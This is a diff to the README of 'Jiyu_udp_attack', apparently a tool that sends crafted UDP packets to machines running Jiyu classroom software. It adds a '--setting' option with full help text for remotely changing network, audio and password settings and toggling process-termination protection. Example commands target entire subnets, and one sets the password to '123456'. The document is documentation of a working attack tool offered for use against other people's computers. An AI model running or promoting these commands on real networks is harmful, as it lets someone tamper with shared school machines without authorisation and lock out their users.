@@ -23,8 +23,8 @@ usage: Jiyu_udp_attack [-h] [-f <ip>] [-fp <port>] -t <ip> [-tp <port>]
                        -s [<timeout> [<message> ...]] |
                        -r [<timeout> [<message> ...]] |
                        -cw [<timeout> [<message> ...]] | -ctw |
-                       -n <name> <name_id> | --hex <hex_data> |
-                       --pkg <custom_data> [<args> ...])
+                       -n <name> <name_id> | --setting [<setting-args>] |
+                       --hex <hex_data> | --pkg <custom_data> [<args> ...])
 
 Jiyu Attack Script
 
@@ -67,6 +67,9 @@ Attack Action:
                         Close the top window on the target machine
   -n, --rename <name> <name_id>
                         Rename the target machine
+  --setting [<setting-args>]
+                        Set specific settings on the target machine
+                        Use `Jiyu_udp_attack -t 127.0.0.1 --setting` for help
   --hex <hex_data>      Send raw hex data to the target machine
   --pkg <custom_data> [<args> ...]
                         Custom packet data to send
@@ -87,6 +90,52 @@ Example usage:
     python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{0.int.little_4}" 1024
     python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{0}{1.size_800}" 4d hello
     python Jiyu_udp_attack -t 192.168.106.100 --pkg test.txt 1024 hello
+    python Jiyu_udp_attack -t 127.0.0.1 --setting
+```
+
+其中由于 `--setting` 的配置过于复杂，程序将其的配置项传入另一个命令行解析器，帮助文档如下：
+
+```
+usage: Jiyu_udp_attack <main-args> --setting="[setting-options]"
+
+Specify settings for the target machine
+
+options:
+  -h, --help            show this help message and exit
+
+Network Configuration:
+  --network             Configure network settings on the target machine
+  --transmission_reliability <reliability>
+                        Set the transmission reliability level (default: medium)
+  --offline-lag-time-detection <time_ms>
+                        Set the offline lag time detection threshold in seconds (default: 10 ms)
+
+Audio Configuration:
+  --audio               Configure audio settings on the target machine
+  --playback-mute       Mute audio playback on the target machine
+  --recording-mute      Mute audio recording on the target machine
+  --playback-volume <volume>
+                        Set the audio playback volume (default: 80)
+  --recording-volume <volume>
+                        Set the audio recording volume (default: 80)
+
+Password Configuration:
+  --password            Configure password settings on the target machine
+  --password-value <password>
+                        Set the password for the target machine (default: empty)
+
+Other Settings:
+  --preventing-process-termination {disable,enable,auto}
+                        Set the process termination prevention mode (default: auto)
+  --lock-screen-when-maliciously-offline {disable,enable,auto}
+                        Set the lock screen mode when maliciously offline (default: auto)
+  --hide-the-setup-name-button {disable,enable,auto}
+                        Set the visibility of the setup name button (default: auto)
+
+Example usage:
+    python Jiyu_udp_attack -t 192.168.233.0/24 --setting=""
+    python Jiyu_udp_attack -t 192.168.233.0/24 --setting="--preventing-process-termination enable"
+    python Jiyu_udp_attack -t 192.168.233.0/24 --setting="--password --password-value 123456"
 ```
 
 ---
